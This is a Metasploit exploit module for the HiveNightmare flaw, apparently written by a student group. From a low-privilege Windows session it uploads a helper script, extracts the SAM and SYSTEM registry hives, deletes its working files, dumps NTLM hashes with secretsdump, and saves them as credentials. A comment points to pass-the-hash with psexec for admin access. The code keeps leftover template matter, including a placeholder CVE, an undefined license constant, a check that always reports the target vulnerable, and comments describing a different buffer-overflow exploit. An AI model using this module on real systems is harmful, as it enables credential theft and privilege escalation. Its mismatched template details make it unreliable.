##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking # https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
  
    #
    # This exploit affects TCP servers, so we use the TCP client mixin.
    # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the
    # vulnerable target program.
    #
    include Msf::Exploit::CmdStager
    include Msf::Auxiliary::Report
  
    def initialize(info = {})
      super(
        update_info(
          info,
          # The Name should be just like the line of a Git commit - software name,
          # vuln type, class. Preferably apply
          # some search optimization so people can actually find the module.
          # We encourage consistency between module name and file name.
          'Name' => 'Hive Nightmare (assuming that is not trademarked or something)',
          'Description' => %q{
            This exploit will steal user:ntlm hashes from a low-privilege windows session that can be used to authenticate as an admin.
          },
          'License' => IDK_LICENSE,
          'Author' => ['ECE509 Group n'],
          'References' => [
            [ 'OSVDB', '12345' ],
            [ 'EDB', '12345' ],
            [ 'URL', 'http://www.example.com'],
            [ 'CVE', '1978-1234']
          ],
          'Session'       => Msf::Sessions::CommandShell,
          'Payload' => {
            'Space' => 0,
          },
          'Targets' => [
            [
              'Windows 10',
              {
                'Platform' => 'win',
              }
            ]
          ],
          'DisclosureDate' => 'TODO',
          'DefaultTarget' => 0,
          # https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability
          'Notes' => {
            'Stability' => [],
            'Reliability' => [],
            'SideEffects' => []
          }
        )
      )
      register_options(
        [
          OptString.new('WORKING_DIR', [ true, "Directory to use to save intermediate files. Deleted when finished.", '%userprofile%\\getsam' ]),
          OptString.new('GET_SAM_PATH', [ true, "Local path to zip file containing get_sam.py.", 'get_sam.zip' ]),
        ]
      )
    end
  
    def check
      CheckCode::Vulnerable
    end
  
    #
    # The exploit method connects to the remote service and sends 1024 random bytes
    # followed by the fake return address and then the payload.
    #
    def exploit
      connect

      # todo: make working_directory etc., options to the user via msfconsole
      pathsep = '\\'
      working_directory = datastore['WORKING_DIR']
      get_sam_py = working_directory + pathsep + 'get_sam.py'
      local_get_sam_zip = datastore['GET_SAM_PATH'] # "/media/sf_share/get_sam.zip"
      remote_get_sam_zip = working_directory + pathsep + "get_sam.zip"
      # todo: call + parse `where python` and `where python3` to find the available interpreters to invoke directly
      get_sam_command = 'python ' + get_sam_py
      
      session.shell_command("cmd")
      session.shell_command("mkdir " + working_directory)
      session.shell_command("cd " + working_directory)
      session.cmd_upload(local_get_sam_zip, remote_get_sam_zip)
      session.shell_command("tar -xf get_sam.zip")

      output_lines = session.shell_command(get_sam_command).split()
      # get_sam.py prints the hashes encoded as base64 to stdout. We are stdout and capture that into output_lines
      session.shell_command("rmdir /S " + working_directory) # clean up after ourselves
      sam_hive = Base64.decode64(output_lines[1][2..-2])
      sys_hive = Base64.decode64(output_lines[2][2..-2])

      # msf has a secretsdump.py script that's been modified so we can't use it directly. Save the hive files and call the default impacket secretsdump.py script to print the hashes. The output is saved into the dump var
      File.open("sam.hive", 'w') { |file| file.write(sam_hive) }
      File.open("sys.hive", 'w') { |file| file.write(sys_hive) }
      dump = `python3 secretsdump.py -sam sam.hive -sys sys.hive local`
      info_re = /(?<user>\w+):\d+:(?<ntlm_hash>\w+:\w+)/
      for entry in dump.split() do
          m = entry.match(info_re)
          if m
              # We matched a user:ntlm_hash pair.
              # Capture the credential and save it in the metasploit database
              opts = {
                  status: Metasploit::Model::Login::Status::UNTRIED,
                  address: session.target_host,
                  username: m[:user],
                  private_data: m[:ntlm_hash],
                  private_type: :ntlm_hash
              }
              datastore.create_credential(opts)
          end
      end

      # after the above captures the credentials into the database, check your msfdb for the username:ntlm hash pairs for the host you exploited and continue with your admin privileges.
      # e.g.
      # python3 psexec.py -hashes <ntlm_hash> user@ip_addr powershell.exe 
      # metasploit could use an auxillary admin module to do this within the console as a new session
    end
end
